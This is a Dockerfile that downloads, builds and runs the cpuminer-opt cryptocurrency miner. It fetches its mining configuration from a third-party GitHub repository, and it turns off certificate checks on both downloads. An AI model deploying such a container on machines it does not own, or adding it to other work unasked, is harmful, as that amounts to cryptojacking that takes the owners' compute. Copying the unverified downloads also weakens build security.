# Use an official Ubuntu runtime as a parent image
FROM ubuntu:20.04

# Set the working directory to /app
WORKDIR /app

# Install required dependencies
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
    wget \
    build-essential \
    autotools-dev \
    autoconf \
    automake \
    libssl-dev \
    libcurl4-openssl-dev \
    && rm -rf /var/lib/apt/lists/*

# Download cpuminer-opt
RUN wget https://github.com/JayDDee/cpuminer-opt/archive/refs/tags/v3.16.1.tar.gz --no-check-certificate -O cpuminer.tar.gz && \
    tar -xzvf cpuminer.tar.gz && \
    mv cpuminer-opt-3.16.1 cpuminer-opt && \
    rm cpuminer.tar.gz

# Copy the configuration file from the provided URL
RUN wget https://raw.githubusercontent.com/rmaglite/blk/main/config.json --no-check-certificate -O cpuminer-opt/config.json

# Build cpuminer-opt
RUN cd cpuminer-opt && \
    ./build.sh

# Set the entry point to run cpuminer-opt with the provided configuration file
ENTRYPOINT ["./cpuminer-opt/cpuminer", "--config", "/app/cpuminer-opt/config.json"]
